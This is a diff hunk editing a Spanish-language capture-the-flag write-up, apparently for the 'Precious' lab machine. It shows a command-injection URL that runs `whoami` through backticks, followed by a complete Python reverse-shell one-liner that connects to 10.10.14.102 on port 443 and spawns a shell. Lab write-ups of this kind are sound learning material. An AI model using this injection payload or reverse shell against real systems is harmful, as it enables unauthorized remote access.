@@ -90,7 +90,7 @@ http://10.10.14.102:8080/?name=%20`whoami`
 
 ![](/assets/img/commons/precious/precious4.png)
 
-Y una vez sabiendo que si funciona, nos mandaremos una reverse shell con python3:
+Y una vez sabiendo que si funciona, por lo tanto tenemos Remote Command Execution(RCE), nos mandaremos una reverse shell con python3:
 
 ```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
